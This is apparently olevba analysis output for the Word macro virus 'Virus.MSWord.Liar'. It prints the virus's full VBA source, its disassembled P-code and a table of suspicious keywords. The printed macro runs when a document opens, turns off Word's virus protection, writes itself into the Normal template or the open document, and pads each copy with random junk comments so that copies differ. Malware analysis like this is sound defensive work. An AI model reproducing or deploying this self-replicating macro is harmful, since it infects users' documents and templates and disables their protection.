olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Liar
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Liar - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub document_open() '
Dim v(150): Options.VirusProtection = False '
Set a = MacroContainer.VBProject: Set ab = a.VBComponents(1) '
Set abc = ab.CodeModule: Set s = NormalTemplate: t = Chr(39) '
Set nh = s.VBProject.VBComponents(1).CodeModule '
For y = 1 To Int(75 - (Rnd * 20)): vx = vx & Chr(255 - Int(Rnd * 100)): Next y '
vc = "Sub document_close()" & t & vx & vbCr '
If MacroContainer = NormalTemplate Then '
Set s = ActiveDocument: Set nh = s.VBProject.VBComponents(1).CodeModule '
vc = "Sub document_open()" & t & vx & vbCr '
End If: Randomize: lin = abc.countoflines '
For i = 2 To lin '
jc = "": d = Int(Rnd * 3): p = InStr(abc.Lines(i, 1), t) '
If p = 0 Then GoTo e_ '
If p = 1 And lin > 100 Then '
d = 1: GoTo n_ '
End If '
v(i) = Left(abc.Lines(i, 1), (p - 1)) '
For j = 1 To Int(75 - (Rnd * 20))  '
jc = jc & Chr(255 - Int(Rnd * 100)) '
Next j '
v(i) = v(i) & t & jc '
If d = 2 Then v(i) = v(i) & vbCr & t & jc '
vc = vc & v(i) & vbCr '
n_: '
Next i '
e_: '
If nh.countoflines < 2 Then '
nh.AddFromString vc: s.Save '
End If '
If Day(Now()) = 31 Then MsgBox Application.UserName & "is bliemed!", 64, "Class.bliem by jacktwo lzo/meta" '
End Sub '
Rem Another virus by Jack Twoflower [LineZer0 & Metaphase] '
Rem Uses "bliem" polymorhic engine by Jack Twoflower '
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Liar
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9817 bytes
' Line #0:
' 	FuncDefn (Sub document_open())
' 	QuoteRem 0x0014 0x0000 ""
' Line #1:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0096 
' 	VarDefn v
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	QuoteRem 0x002C 0x0000 ""
' Line #2:
' 	SetStmt 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	Set a 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld a 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set ab 
' 	QuoteRem 0x003D 0x0000 ""
' Line #3:
' 	SetStmt 
' 	Ld ab 
' 	MemLd CodeModule 
' 	Set abc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set s 
' 	BoS 0x0000 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	St t 
' 	QuoteRem 0x003D 0x0000 ""
' Line #4:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld s 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nh 
' 	QuoteRem 0x0030 0x0000 ""
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x004B 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	Paren 
' 	Sub 
' 	FnInt 
' 	For 
' 	BoS 0x0000 
' 	Ld vx 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St vx 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x004F 0x0000 ""
' Line #6:
' 	LitStr 0x0014 "Sub document_close()"
' 	Ld t 
' 	Concat 
' 	Ld vx 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St vc 
' 	QuoteRem 0x002C 0x0000 ""
' Line #7:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0028 0x0000 ""
' Line #8:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set s 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld s 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nh 
' 	QuoteRem 0x0048 0x0000 ""
' Line #9:
' 	LitStr 0x0013 "Sub document_open()"
' 	Ld t 
' 	Concat 
' 	Ld vx 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St vc 
' 	QuoteRem 0x002B 0x0000 ""
' Line #10:
' 	EndIfBlock 
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	Ld abc 
' 	MemLd countoflines 
' 	St lin 
' 	QuoteRem 0x002A 0x0000 ""
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld lin 
' 	For 
' 	QuoteRem 0x0011 0x0000 ""
' Line #12:
' 	LitStr 0x0000 ""
' 	St jc 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	St d 
' 	BoS 0x0000 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld abc 
' 	ArgsMemLd Lines 0x0002 
' 	Ld t 
' 	FnInStr 
' 	St p 
' 	QuoteRem 0x0039 0x0000 ""
' Line #13:
' 	Ld p 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo e_ 
' 	EndIf 
' 	QuoteRem 0x0016 0x0000 ""
' Line #14:
' 	Ld p 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld lin 
' 	LitDI2 0x0064 
' 	Gt 
' 	And 
' 	IfBlock 
' 	QuoteRem 0x001C 0x0000 ""
' Line #15:
' 	LitDI2 0x0001 
' 	St d 
' 	BoS 0x0000 
' 	GoTo n_ 
' 	QuoteRem 0x000F 0x0000 ""
' Line #16:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0000 ""
' Line #17:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld abc 
' 	ArgsMemLd Lines 0x0002 
' 	Ld p 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	ArgsSt v 0x0001 
' 	QuoteRem 0x0026 0x0000 ""
' Line #18:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x004B 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	Paren 
' 	Sub 
' 	FnInt 
' 	For 
' 	QuoteRem 0x0023 0x0000 ""
' Line #19:
' 	Ld jc 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St jc 
' 	QuoteRem 0x0024 0x0000 ""
' Line #20:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0007 0x0000 ""
' Line #21:
' 	Ld i 
' 	ArgsLd v 0x0001 
' 	Ld t 
' 	Concat 
' 	Ld jc 
' 	Concat 
' 	Ld i 
' 	ArgsSt v 0x0001 
' 	QuoteRem 0x0015 0x0000 ""
' Line #22:
' 	Ld d 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	ArgsLd v 0x0001 
' 	Ld vbCr 
' 	Concat 
' 	Ld t 
' 	Concat 
' 	Ld jc 
' 	Concat 
' 	Ld i 
' 	ArgsSt v 0x0001 
' 	EndIf 
' 	QuoteRem 0x002A 0x0000 ""
' Line #23:
' 	Ld vc 
' 	Ld i 
' 	ArgsLd v 0x0001 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St vc 
' 	QuoteRem 0x0016 0x0000 ""
' Line #24:
' 	Label n_ 
' 	QuoteRem 0x0004 0x0000 ""
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0007 0x0000 ""
' Line #26:
' 	Label e_ 
' 	QuoteRem 0x0004 0x0000 ""
' Line #27:
' 	Ld nh 
' 	MemLd countoflines 
' 	LitDI2 0x0002 
' 	Lt 
' 	IfBlock 
' 	QuoteRem 0x001C 0x0000 ""
' Line #28:
' 	Ld vc 
' 	Ld nh 
' 	ArgsMemCall AddFromString 0x0001 
' 	BoS 0x0000 
' 	Ld s 
' 	ArgsMemCall Save 0x0000 
' 	QuoteRem 0x001C 0x0000 ""
' Line #29:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0000 ""
' Line #30:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Application 
' 	MemLd UserName 
' 	LitStr 0x000B "is bliemed!"
' 	Concat 
' 	LitDI2 0x0040 
' 	LitStr 0x001F "Class.bliem by jacktwo lzo/meta"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' 	QuoteRem 0x0069 0x0000 ""
' Line #31:
' 	EndSub 
' 	QuoteRem 0x0008 0x0000 ""
' Line #32:
' 	Rem 0x0039 " Another virus by Jack Twoflower [LineZer0 & Metaphase] '"
' Line #33:
' 	Rem 0x0033 " Uses "bliem" polymorhic engine by Jack Twoflower '"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

